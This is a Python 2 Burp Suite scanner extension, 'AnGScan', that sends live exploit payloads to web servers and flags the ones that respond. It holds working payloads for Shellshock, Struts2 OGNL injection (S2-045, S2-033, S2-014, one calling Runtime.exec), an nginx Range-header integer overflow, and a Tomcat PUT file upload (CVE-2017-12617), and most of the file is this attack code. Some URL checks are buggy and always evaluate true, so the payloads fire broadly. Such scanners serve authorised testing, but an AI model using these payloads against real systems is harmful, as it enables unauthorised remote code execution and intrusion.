#!/usr/bin/env python2
#coding = utf-8
__author__ = 'L_AnG'


#Burpsuite module
from burp import IBurpExtender
from burp import IRequestInfo
from burp import IResponseInfo
from burp import IScanIssue
from burp import IScannerCheck


#python module
import sys
sys.path.append('/usr/lib/python2.7/site-packages') #INCLUDE YOUR lib
from array import array
import requests
#Extender describre



class BurpExtender(IBurpExtender,IRequestInfo,IResponseInfo,IScanIssue,IScannerCheck):
    
    
    def registerExtenderCallbacks(self,callbacks):
        
        #keep a reference to our callbacks object
        self._callbacks = callbacks
        
        #helper methods
        self._helpers = callbacks.getHelpers()
        
        #define name
        self._callbacks.setExtensionName("AnGScan")
        #register a scancheck
        callbacks.registerScannerCheck(self)
                        
        return
    
    
    #match
    def getMatches(self, text, match):
        
        text = self._helpers.bytesToString(text.getResponse())
        star = text.find(match)
        count = 0
        matches = [array('i')]
        matches[count]
        matches[count].append(star)
        matches[count].append(star+len(match))

        return matches

    def report_list(self,new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL):
        reportlist = []
        reportlist.append(new_headers)
        reportlist.append(new_body)
        reportlist.append(re)
        reportlist.append(vul)
        reportlist.append(ISSUE_NAME)
        reportlist.append(ISSUE_DETAIL)
        reportlist.append(ISSUE_BACKGROUND)
        reportlist.append(REMEDIATION_DETAIL)
        
        return reportlist
        

    def doPassiveScan(self,baseRequestResponse):
        issue = []
        PATTERN="AnG"
        REMEDIATION_BACKGROUND="Sensitive Action"
        SEVERITY="High"
        CONFIDENCE="Certain"
        #############################

        reports = []
        #send to payload_def
        #new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.def(baseRequestResponse)
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.shellshock(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.s2_045(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.s2_033(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.s2_014(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.nginx_info_leak(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))
        
        new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL = self.tomcat_rce1(baseRequestResponse)
        reports.append(self.report_list(new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL))  
        #if vul
        for report in reports:
            if report[3] == 1:
                #make new Ihttprequestresponse
                NewRequest = self._helpers.buildHttpMessage(report[0], report[1])
                
                baseRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest)
                
                #mark re
                match = self.getMatches(baseRequestResponse,report[2])
                
                httpmsgs = [self._callbacks.applyMarkers(baseRequestResponse,None,match)]
                   
                issue.append(ScanIssue(baseRequestResponse.getHttpService(), self._helpers.analyzeRequest(baseRequestResponse).getUrl(),httpmsgs, report[4], report[5], SEVERITY, CONFIDENCE, report[7], report[6], REMEDIATION_BACKGROUND))                

        return issue
    #payload code
    
    #shellshock
    def shellshock(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = 'test for CVE-2014-6271'
        vul = 0
        ISSUE_NAME="shellshock"
        ISSUE_DETAIL="RCE"
        ISSUE_BACKGROUND="User-Agent:() \x7B :; \x7D; echo; echo test for CVE-$((2000+14))-6271;"
        REMEDIATION_DETAIL="CVE-2014-6271  RCE"
        #########################
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        
        url = baseRequest.getUrl()
        if '/cgi-bin/' in str(url):
            payload = '() \x7B :; \x7D; echo; echo test for CVE-$((2000+14))-6271;'
                  
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                # Look for Content-Type Header)
                if header.startswith("User-Agent:"):
                    header = "User-Agent: "+payload
                    new_headers.append(header)
                    h=1
                else:
                    new_headers.append(header)
            if h == 0:
                new_headers.append("User-Agent: "+payload)
                
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            if re in NewResponse:
                vul = 1
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL
    
    #s2-045
    def s2_045(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = '105059592'
        vul = 0
        ISSUE_NAME="s2-045"
        ISSUE_DETAIL="RCE"
        ISSUE_BACKGROUND="%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
        REMEDIATION_DETAIL="s2-045  RCE"
        ######################### 
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        
        url = baseRequest.getUrl()
        
        if '.action' in str(url):
            payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
                          
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                # Look for Content-Type Header)
                if header.startswith("Content-Type:"):
                    header = "Content-Type: "+payload
                    new_headers.append(header)
                    h =1
                else:
                    new_headers.append(header)
            if h == 0:
                new_headers.append("Content-Type: "+payload)
            
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            
            if re in NewResponse:
                vul = 1
            
                
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL
    
    #s2-033
    def s2_033(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = '29ang0860253718'
        vul = 0
        ISSUE_NAME="s2-033"
        ISSUE_DETAIL="RCE"
        ISSUE_BACKGROUND="/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=29ang08"
        REMEDIATION_DETAIL="s2-033  RCE"
        ######################### 
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        
        url = baseRequest.getUrl()

        if '/page/' or '/order/' or '/list/' or '/number/' in str(url):
            payload = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=29ang08  HTTP"
                          
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                #
                if header.startswith("GET") or header.startswith("POST"):
                    
                    header = header.replace(' HTTP',payload)
                    new_headers.append(header)
                    h =1
                else:
                    new_headers.append(header)
            #if h == 0:
            #    new_headers.append("Content-Type: "+payload)
            
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            
            if re in NewResponse:
                vul = 1
                        
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL
    
    #s2-014
    def s2_014(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = 'rce_test=moresec_rce_test'
        vul = 0
        ISSUE_NAME="s2-014"
        ISSUE_DETAIL="RCE"
        ISSUE_BACKGROUND="%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27echo%20moresec_rce_test%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27rce_test%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
        REMEDIATION_DETAIL="s2-013/14  RCE"
        ######################### 
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        baseResponseText = self._helpers.bytesToString(baseRequestResponse.getResponse())
        
        url = baseRequest.getUrl()

        if '.action?' in str(url):
            
            payload = "%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27echo%20moresec_rce_test%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27rce_test%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
                                
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                #
                if header.startswith("GET") or header.startswith("POST"):
                    
                    s = header.find('.action?')
                    e = header.find(' HTTP')
                    header = header.replace(header[s+8:e],payload)
                    new_headers.append(header)
                    h =1
                else:
                    new_headers.append(header)
            #if h == 0:
            #    new_headers.append("Content-Type: "+payload)
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            
            if re in NewResponse:
                vul = 1
                        
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL
    
    #nginx_info_leak
    def nginx_info_leak(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = 'Content-Range'
        vul = 0
        ISSUE_NAME="nginx_info_leak"
        ISSUE_DETAIL="InfoLeak"
        ISSUE_BACKGROUND="Range:"
        REMEDIATION_DETAIL="nginx_info_leak  InfoLeak"
        ######################### 
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        
        url = baseRequest.getUrl()
        
        if '.ico' or '.png' in str(url):
                
            r = requests.get(url, verify=False)
            
            if r.status_code == 200:

                length = r.headers['Content-Length']
    
    
                payload = "Range: bytes=-%d,-9223372036854%d" % (int(length) + 623, 776000 - (int(length) + 623))
            
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                #
                    
                if header.startswith("Range:"):
                    
                    header = payload
                    new_headers.append(header)
                    h =1
                elif header.startswith("If-Modified-Since:") or header.startswith("If-None-Match:") or header.startswith("Upgrade-Insecure-Requests:") or header.startswith("Cache-Control:"):
                    1
                else:
                    new_headers.append(header)
                    
            if h == 0:
                new_headers.append(payload)
                
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            
            if re in NewResponse and self._helpers.analyzeResponse(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse()).getStatusCode() == 206:
                vul = 1
    
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL
        
    #intel_privilege
    def tomcat_rce1(self,baseRequestResponse):
        ###################
        new_body = ''
        new_headers =[]
        re = 'AnGScan'
        vul = 0
        ISSUE_NAME="Tomcat RCE CVE-2017-12617)"
        ISSUE_DETAIL="RCE"
        ISSUE_BACKGROUND="put"
        REMEDIATION_DETAIL="Tomcat RCE CVE-2017-12617)  RemoteCmdExec"
        ######################### 
        baseRequest = self._helpers.analyzeRequest(baseRequestResponse)
        
        url = baseRequest.getUrl()
        
        if url:
            
            headers = baseRequest.getHeaders()
            h=0
            for header in headers:
                #
                    
                if header.startswith("GET") or header.startswith("POST"):
                    
                    header = 'PUT /ang.jsp/ HTTP/1.1'
                    new_headers.append(header)
                    h =1
                else:
                    new_headers.append(header)
                
            new_headers.append('\r\n')
            new_headers.append('AnGScan test')
                    
            #if h == 0:
            #    new_headers.append(payload)
                
            NewRequest = self._helpers.buildHttpMessage(new_headers, new_body)
        
            NewResponse = self._helpers.bytesToString(self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),NewRequest).getResponse())
            
            exp_url = str(url)+'/ang.jsp'
            r = requests.get(exp_url, verify=False)
            
            if re in r.text:
                vul = 1
    
        return new_headers,new_body,re,vul,ISSUE_NAME,ISSUE_DETAIL,ISSUE_BACKGROUND,REMEDIATION_DETAIL

class ScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpmsg,issueName, issueDetail, severity, confidence, remediationDetail, issueBackground, remediationBackground):
        self._issueName = issueName
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpmsg
        self._issueDetail = issueDetail
        self._severity = severity
        self._confidence = confidence
        self._remediationDetail = remediationDetail
        self._issueBackground = issueBackground
        self._remediationBackground = remediationBackground
  
  
    def getConfidence(self):
        return self._confidence
  
    def getHttpMessages(self):
        return self._httpMessages
        #return None
  
    def getHttpService(self):
        return self._httpService
  
    def getIssueBackground(self):
        return self._issueBackground
  
    def getIssueDetail(self):
        return self._issueDetail
  
    def getIssueName(self):
        return self._issueName
  
    def getIssueType(self):
        return 0
  
    def getRemediationBackground(self):
        return self._remediationBackground
  
    def getRemediationDetail(self):
        return self._remediationDetail
  
    def getSeverity(self):
        return self._severity
  
    def getUrl(self):
        return self._url
    